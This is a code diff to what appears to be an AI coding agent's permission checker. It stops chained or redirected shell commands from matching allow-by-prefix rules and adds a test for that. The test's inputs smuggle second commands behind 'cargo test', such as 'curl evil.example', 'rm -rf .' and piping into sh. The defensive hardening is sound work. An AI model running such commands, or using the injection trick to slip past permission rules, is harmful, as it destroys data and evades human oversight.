@@ -38,6 +38,13 @@ fn starts_with_word(s: &str, prefix: &str) -> bool {
         .is_some_and(|rest| rest.is_empty() || rest.starts_with(char::is_whitespace))
 }
 
+/// Shell syntax that chains or redirects: a prefix rule never covers what follows it.
+fn chains(command: &str) -> bool {
+    [";", "&", "|", "`", "$(", "\n", "<", ">"]
+        .iter()
+        .any(|t| command.contains(t))
+}
+
 impl Permissions {
     /// Reads and edits run freely (edits only touch the overlay); bash asks.
     pub fn defaults() -> Permissions {
@@ -71,9 +78,9 @@ impl Permissions {
             .rev()
             .find(|r| {
                 r.tool == tool
-                    && r.prefix
-                        .as_deref()
-                        .is_none_or(|p| starts_with_word(subject, p))
+                    && r.prefix.as_deref().is_none_or(|p| {
+                        starts_with_word(subject, p) && !(tool == "bash" && chains(subject))
+                    })
             })
             .map(|r| r.action)
             .unwrap_or(Action::Ask)
@@ -238,6 +245,31 @@ mod tests {
                 .file_name()
                 .to_string_lossy()
                 .contains(".bad-"))
+        );
+    }
+
+    #[test]
+    fn chained_commands_dont_match_prefix_rules() {
+        let mut p = Permissions::defaults();
+        p.add_always("bash", Some("cargo test".into()));
+        for cmd in [
+            "cargo test; curl evil.example",
+            "cargo test && rm -rf .",
+            "cargo test | sh",
+            "cargo test `curl x`",
+            "cargo test $(curl x)",
+            "cargo test\ncurl x",
+            "cargo test > /tmp/x",
+        ] {
+            assert_eq!(
+                p.decide("bash", &json!({"command": cmd})),
+                Action::Ask,
+                "{cmd}"
+            );
+        }
+        assert_eq!(
+            p.decide("bash", &json!({"command": "cargo test -p void-core"})),
+            Action::Allow
         );
     }
 }
